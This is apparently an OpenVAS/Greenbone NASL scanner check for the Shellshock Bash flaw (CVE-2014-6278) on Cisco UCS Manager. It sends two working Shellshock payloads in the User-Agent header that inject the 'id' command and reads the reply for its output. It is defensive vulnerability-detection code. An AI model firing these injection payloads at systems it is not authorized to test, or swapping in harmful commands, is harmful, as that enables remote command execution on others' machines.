# SPDX-FileCopyrightText: 2016 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:cisco:unified_computing_system";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.105570");
  script_version("2025-09-02T05:39:48+0000");
  script_tag(name:"last_modification", value:"2025-09-02 05:39:48 +0000 (Tue, 02 Sep 2025)");
  script_tag(name:"creation_date", value:"2016-03-17 09:25:23 +0100 (Thu, 17 Mar 2016)");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");

  script_cve_id("CVE-2014-6278");

  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("Cisco UCS Manager GNU Bash Environment Variable Command Injection Vulnerability (cisco-sa-20140926-bash, Shellshock) - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2016 Greenbone AG");
  script_family("CISCO");
  script_dependencies("gb_cisco_ucs_manager_http_detect.nasl");
  script_mandatory_keys("cisco/ucs_manager/http/detected");
  script_require_ports("Services/www", 443);

  script_tag(name:"summary", value:"On September 24, 2014, a vulnerability in the Bash shell was
  publicly announced. The vulnerability is related to the way in which shell functions are passed
  though environment variables. The vulnerability may allow an attacker to inject commands into a
  Bash shell, depending on how the shell is invoked. The Bash shell may be invoked by a number of
  processes including, but not limited to, telnet, SSH, DHCP, and scripts hosted on web server");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"insight", value:"GNU bash contains a flaw that is triggered when evaluating
  environment variables passed from another environment. After processing a function definition,
  bash continues to process trailing strings.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote  or local attackers to
  inject  shell commands, allowing local privilege escalation or remote command execution depending
  on the application vector.");

  script_tag(name:"solution", value:"See vendor advisory for a solution");

  script_xref(name:"URL", value:"https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20140926-bash");
  script_xref(name:"URL", value:"https://bst.cloudapps.cisco.com/bugsearch/bug/CSCur01379");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");

if( ! port = get_app_port( cpe:CPE, service:"www" ) )
  exit( 0 );

if( ! get_app_location( cpe:CPE, port:port, nofork:TRUE ) )
  exit( 0 );

url = "/ucsm/isSamInstalled.cgi";

useragent = http_get_user_agent();
vtstrings = get_vt_strings();
vt_string = vtstrings["default"];

attacks = make_list( '() { ' + vt_string + ':; }; echo Content-Type: text/plain; echo; echo; PATH=/usr/bin:/usr/local/bin:/bin; export PATH; id;',
                     '() { _; ' + vt_string + '; } >_[$($())] {  echo Content-Type: text/plain; echo; echo; PATH=/usr/bin:/usr/local/bin:/bin; export PATH; id; }'
                   );

host = http_host_name( port:port );

foreach attack ( attacks )
{
  req = 'GET ' + url + ' HTTP/1.1\r\n' +
        'Host: ' + host + '\r\n' +
        'User-Agent: ' + attack + '\r\n' +
        'X-Security-Scanner: ' + useragent + '\r\n' +
        'Connection: close\r\n' +
        'Accept: */*\r\n' +
        '\r\n';

  buf = http_keepalive_send_recv( port:port, data:req, bodyonly:FALSE );

  if( buf =~ 'uid=[0-9]+.*gid=[0-9]+' )
  {
    report = http_report_vuln_url(  port:port, url:url ) + '\n\n';
    report += "It was possible to execute the `id' command on the remote host" + '\n';
    report += '\nResponse:\n' + buf;
    security_message( port:port, data:report );
    exit( 0 );
  }
}

exit( 99 );
